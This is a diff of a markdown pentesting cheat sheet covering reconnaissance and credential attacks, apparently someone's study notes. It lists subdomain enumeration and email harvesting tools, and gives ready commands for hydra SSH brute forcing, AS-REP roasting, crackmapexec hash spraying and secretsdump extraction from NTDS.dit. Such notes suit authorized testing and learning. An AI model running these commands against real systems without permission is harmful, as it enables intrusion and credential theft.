@@ -11,15 +11,15 @@
   - [Wappalyzer](https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/)
 	    
 ## Subdomains:
-  - `sublist3r`
+  - `assetfinder url.com`
+  - `sublist3r -d url.com`
   - **theHarvester**
     - `theHarvester -d website.com -b all -l 500`
         - limits to 500 searches
-  - `recon.ng`
+  - `dnsrecon`
   - [Subfinder](https://github.com/projectdiscovery/subfinder)
-  - [Assetfinder](https://github.com/tomnomnom/assetfinder)
   - [httprobe](https://github.com/tomnomnom/httprobe)
-  - [Amass](https://github.com/OWASP/Amass)
+  - `amass enum -d url.com`
   - [crt.sh](https://crt.sh/)
 
 ## Email Addresses
@@ -28,15 +28,13 @@
   - **username-anarchy**
   - `./username-anarchy --input-file fullnames.txt --select-format first,flast,first.last,firstl > unames.txt`
   - **theHarvester**
-    - `theHarvester -d url.com -b all -l 500` 
-    - `whatsmyname -u username`
+    - `theHarvester -d url.com -b all -l 500`
 
 ## Passwords
   - **Dehashed**
   - [HaveIbeenpwnd](https://haveibeenpwned.com/)
   - `cewl` - pulls words from a site that can be used as a password
   - **Burpsuite** to intercept and attempt logins
-		- `python-exrex` permutates common default PWs schemas 
   - **Brute force** 
     - **hydra**
 	    - `hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://IP -t 4 -V
@@ -77,7 +75,7 @@
  		- `impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip IP domainname/`
 - **With Hashes:** 
 	- Spray with crackmap:
-		- `cme smb IP -u users -H hashes`
+		- `cme smb 10.0.0.12 -u users -H hashes`
 		- this will spit out any working username: password
 - **Secrets dump:**
 	- `secretsdump.py -ntds NTDS.dit -system system.hive LOCAL`
